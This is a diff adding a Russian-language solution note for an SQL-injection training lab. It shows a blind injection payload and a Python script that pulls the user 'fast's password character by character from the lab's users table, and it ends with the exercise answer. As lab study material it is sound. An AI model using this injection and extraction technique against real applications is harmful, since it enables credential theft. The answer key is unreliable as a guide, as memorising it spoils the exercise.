@@ -1,0 +1,46 @@
+https://sql.training.hackerdom.ru/8qqqwwweeerrr.php
+---------------------------------------------------
+
+Таблицы: users
+Поля: id, login, pass
+Запрос: SELECT * FROM users WHERE id=$text
+
+Выводит только количество записей
+
+
+
+вот сам запрос
+
+-1 or id<=(select ascii(mid(pass,1,1)) from users where login='fast')
+
+ascii() - перевод в аски
+mid() - если символ
+
+предположим что символов в пароле - 10
+
+
+написал такой код для подбора пароля
+
+
+import requests
+from bs4 import BeautifulSoup
+
+url = 'https://sql.training.hackerdom.ru/8qqqwwweeerrr.php?text='
+
+password = ''
+
+for i in range(1,10):
+    r = requests.get(url+f"-1 or id<=(select ascii(mid(pass,{i},1)) from users where login='fast')", verify=False)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    table_count = soup.find('div', class_='table-count')
+    if table_count:
+        text_after_colon = table_count.text.split(': ', 1)[-1].strip()
+        password += chr(int(text_after_colon))
+
+print(password)
+
+Ответ: 9levlpass
+
+
+
+
